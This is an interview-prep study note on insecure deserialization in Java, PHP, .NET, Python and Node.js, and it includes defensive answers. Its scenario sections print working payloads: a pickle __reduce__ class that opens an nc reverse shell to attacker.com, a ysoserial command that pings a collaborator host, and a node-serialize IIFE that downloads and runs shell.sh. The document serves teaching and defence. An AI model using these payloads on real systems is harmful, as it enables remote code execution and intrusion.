---
tags: [interview, web-security, qna, scenario]
difficulty: expert
module: "Interview Prep - Web Security"
topic: "QnA - Web Module 09"
---

# Insecure Deserialization Interview Guide

## Formal Technical Questions

### Q1: Define Serialization and Deserialization. Why does deserialization become insecure, and what is a "Gadget Chain"?
**Answer:**
- **Serialization:** The process of converting complex data structures or object states into a format (like a byte stream, JSON, or XML) that can be stored, transmitted over a network, or saved to a database.
- **Deserialization:** The reverse process, where the byte stream is reconstructed back into live, executable objects in memory.
- **Insecure Deserialization:** This vulnerability occurs when an application deserializes untrusted, user-controllable data without verifying its integrity. If an attacker tampers with the serialized object, the application will reconstruct a malicious object. During the deserialization process, certain "Magic Methods" (methods automatically invoked upon object creation/destruction) are triggered. If the attacker manipulates the state of the object, they can subvert the logic of these magic methods.
- **Gadget Chain:** A gadget is a snippet of code within the application's existing codebase (or its dependencies) that can be invoked during deserialization and manipulated to perform a harmful action. Because a single gadget rarely results in RCE, attackers link multiple gadgets together. The output of one gadget feeds into the input of another, creating a "Gadget Chain" that eventually culminates in a critical impact, such as executing arbitrary system commands.

### Q2: Explain the mechanics of Java Insecure Deserialization. What role does `ysoserial` play, and what is the significance of the `readObject()` method?
**Answer:**
In Java, serialization is handled by the `java.io.Serializable` interface. 
- **Mechanics:** When an object is deserialized using `ObjectInputStream.readObject()`, the JVM reconstitutes the object. If the class of the deserialized object has overridden the `readObject()` method (a magic method), the JVM executes this custom logic immediately upon deserialization, before the application ever checks the type of the returned object.
- **ysoserial:** `ysoserial` is a renowned exploitation tool. It contains a collection of pre-discovered gadget chains for common Java libraries (like CommonsCollections, Spring, Hibernate). An attacker uses ysoserial to generate a malicious serialized object payload targeting a specific vulnerable library present in the application's classpath.
- **Significance of `readObject()`:** It is the entry point. An attacker crafts a serialized payload specifying a class that has a dangerous `readObject()` implementation. When the target server deserializes the payload, it invokes that `readObject()` method with the attacker-controlled object state, kicking off the gadget chain that leads to RCE.

### Q3: How does PHP Object Injection (Insecure Deserialization) work? Detail the relevant magic methods and the `phar://` wrapper.
**Answer:**
PHP handles serialization natively via `serialize()` and `unserialize()`.
- **Magic Methods:** PHP Object Injection relies on magic methods that begin with `__`.
  - `__wakeup()`: Triggered immediately upon `unserialize()`. Often used to re-establish database connections.
  - `__destruct()`: Triggered when the object is destroyed or the script ends. Often used for cleanup, like deleting temporary files.
  - `__toString()`: Triggered when the object is treated as a string (e.g., `echo $obj;`).
  An attacker manipulates the serialized string (e.g., `O:4:"User":1:{s:4:"name";s:5:"admin";}`) to instantiate arbitrary classes present in the application context and control their properties to exploit these magic methods.
- **`phar://` Wrapper:** The PHP Archive (`phar://`) wrapper is a critical vector. Even if an application does not explicitly call `unserialize()`, many file system functions (like `file_exists()`, `md5_file()`, `stat()`) will automatically deserialize metadata contained within a `.phar` archive if the `phar://` wrapper is used. An attacker can upload a malicious `.phar` file masked as an image and trigger deserialization by passing `phar://path/to/uploaded/image.jpg` to a vulnerable file operation.

### Q4: Contrast the exploitation of Insecure Deserialization in Java versus .NET. What are the common formatters and sinks?
**Answer:**
- **Java:** Focuses primarily on native binary serialization (`ObjectInputStream`). Payloads usually begin with the hex signature `aced 0005` (base64 `rO0AB`). Exploitation relies heavily on the classpath and known libraries like Apache Commons.
- **.NET:** .NET possesses a wider variety of serialization formatters, many of which are vulnerable.
  - **Formatters:** `BinaryFormatter` (most dangerous, native binary), `NetDataContractSerializer`, `LosFormatter` (used in WebForms ViewState), `XmlSerializer`, and `Json.NET` (if TypeNameHandling is set to Auto/All).
  - **Sinks:** The vulnerability often triggers during the invocation of properties or explicitly during `Formatter.Deserialize()`. Gadget chains in .NET (e.g., created by `ysoserial.net`) often utilize classes like `ObjectDataProvider` or `WindowsIdentity` to execute commands or load malicious assemblies via Reflection.

## Scenario-Based Questions

### Q1: You are auditing a web application and notice a cookie named `auth_token` with the value `rO0ABXNyAA9qYXZhLnV0aWwuRGF0ZWhqgQFLWXQZAwAAeHB3CAAAAYXzH...`. How do you proceed to test for and exploit Insecure Deserialization?
**Answer:**
1. **Identification:** The `rO0AB` prefix is the Base64-encoded representation of Java's magic bytes `AC ED 00 05`. This confirms the application is passing a Java serialized object via the cookie.
2. **Library Enumeration:** I cannot see the backend codebase, so I must perform blind exploitation. I will generate payloads for common libraries.
3. **Payload Generation:** I will use `ysoserial` to generate payloads utilizing DNS exfiltration to confirm RCE blindly.
   ```bash
   java -jar ysoserial.jar CommonsCollections1 "ping -c 3 %USERNAME%.collaborator.net" | base64 -w0
   ```
4. **Exploitation:** I will iterate through ysoserial payloads (CommonsCollections 1-7, Spring1, Hibernate1, etc.), URL-encode the resulting base64 string, and replace the `auth_token` cookie.
5. **Confirmation:** If I receive a DNS interaction on my Collaborator server containing the username, RCE is confirmed.

### Q2: You are testing a Python Django application. You find a parameter passing a base64 string. Decoding it reveals non-printable characters ending with a `.` (dot). You suspect `pickle` deserialization. How do you construct an exploit?
**Answer:**
Python's `pickle` library is notoriously insecure. When unpickling, it can execute arbitrary Python code defined via the `__reduce__` method.
1. **Payload Construction:** I will write a short Python script to create a malicious object using `__reduce__` to execute an OS command.
   ```python
   import pickle
   import base64
   import os

   class Exploit(object):
       def __reduce__(self):
           # The tuple returned dictates the callable and its arguments
           return (os.system, ('nc -e /bin/sh attacker.com 4444',))

   payload = base64.b64encode(pickle.dumps(Exploit()))
   print(payload.decode())
   ```
2. **Execution:** I will send the generated base64 payload to the vulnerable parameter. When the Django application calls `pickle.loads()` on the input, the `__reduce__` method will instruct the interpreter to execute `os.system` with my reverse shell command, bypassing application logic entirely.

## Deep-Dive Defensive Questions

### Q1: A development team is using Java and needs to deserialize objects transmitted over the network. They refuse to use JSON because of performance overhead. How do you secure Java native deserialization?
**Answer:**
Securing native Java deserialization is notoriously difficult, but if mandated, the primary defense is implementing strict **Look-Ahead Deserialization** using a custom `ObjectInputStream`.
1. **Override `resolveClass`:** Create a custom subclass of `ObjectInputStream` and override the `resolveClass()` method.
2. **Implement an Allowlist:** Within `resolveClass()`, inspect the `ObjectStreamClass` descriptor before the object is instantiated. Compare the class name against a strict allowlist of classes that the application explicitly expects to deserialize.
3. **Rejection:** If the class is not on the allowlist (e.g., it's `org.apache.commons.collections.functors.InvokerTransformer`), throw an `InvalidClassException`.
   ```java
   public class SecureObjectInputStream extends ObjectInputStream {
       @Override
       protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
           if (!desc.getName().equals("com.myapp.ExpectedDataClass")) {
               throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
           }
           return super.resolveClass(desc);
       }
   }
   ```
*Note:* Modern Java (JEP 290) provides built-in mechanisms to implement deserialization filters at the JVM level, which is the industry standard approach if native serialization must be used.

### Q2: Can cryptographic signatures (HMAC) effectively prevent Insecure Deserialization vulnerabilities? What are the limitations?
**Answer:**
Yes, applying an HMAC (Hash-Based Message Authentication Code) to the serialized object state *before* transmitting it, and verifying the signature *before* deserialization, is a highly effective defense.
**Mechanism:**
1. Serialize the object.
2. Generate an HMAC of the serialized byte stream using a strong, secret server-side key.
3. Append the HMAC to the data sent to the user (e.g., `cookie = base64(data) + "." + hmac`).
4. Upon receiving the cookie, recalculate the HMAC. If it doesn't match the provided HMAC, reject the payload and **do not deserialize**.

**Limitations & Risks:**
- **Key Secrecy:** If the HMAC secret key is compromised (via LFI, SSRF, or exposed in a repository), the attacker can forge valid signatures for malicious payloads.
- **Implementation Flaws:** If the application performs deserialization *before* validating the HMAC (a common logical flaw), the vulnerability remains fully exploitable.
- **Replay Attacks:** Unless the serialized object contains a timestamp or nonce, an attacker could capture a valid serialized object and replay it later, potentially exploiting business logic flaws (though not RCE).

## Real-World Attack Scenario

### Node.js Deserialization to RCE via IIFE
An attacker is assessing a modern Node.js web application utilizing the `node-serialize` library for session management. 

1. **Reconnaissance:** The attacker logs in and receives a cookie: `session=eyJ1c2VybmFtZSI6ImFkbWluIn0=`. Decoding this yields JSON-like data.
2. **Vulnerability Identification:** The attacker notices the application uses `node-serialize`, which extends standard JSON to allow the serialization of JavaScript functions. The format looks like: `{"username":"admin", "func":"_$$ND_FUNC$$_function(){ console.log('hello'); }"}`.
3. **Payload Crafting:** `node-serialize` uses `eval()` internally to reconstruct functions. The attacker crafts a payload utilizing an Immediately Invoked Function Expression (IIFE) to execute code simply upon deserialization, without the application ever needing to call the function.
   ```json
   {
     "username": "admin",
     "rce": "_$$ND_FUNC$$_function(){ require('child_process').exec('wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh', function(error, stdout, stderr) { console.log(stdout) }); }()"
   }
   ```
   *Note the `()` at the end of the function definition, triggering the IIFE.*
4. **Execution:** The attacker base64-encodes the payload, sets it as their session cookie, and sends a request.
5. **Impact:** The Node.js backend receives the cookie, calls `serialize.unserialize()`. When it parses the `_$$ND_FUNC$$_` tag, it evaluates the function string. Because of the IIFE `()`, the `require('child_process').exec(...)` executes immediately, downloading and executing the attacker's reverse shell.

```text
  [ Attacker ]
      | 1. Craft JSON payload with IIFE
      V
  [ Base64 Session Cookie ]
      | 2. HTTP GET /dashboard
      V
  [ Node.js Application ]
      | 3. serialize.unserialize(cookie)
      | 4. eval() processes the IIFE
      V
  [ OS Execution ] --> child_process.exec('wget ...') --> RCE!
```

## Chaining Opportunities
- Chaining with **Directory Traversal** to locate and read the application's configuration files to steal HMAC signing keys, thereby bypassing integrity protections.
- Chaining with **SSRF** to pivot and attack internal deserialization endpoints (like internal JBoss or WebLogic management consoles) that are not exposed to the internet.

## Related Notes
- [[14 - Object-Oriented Programming Concepts]]
- [[22 - Java Memory Management and JVM]]
- [[26 - Post-Exploitation Persistence]]
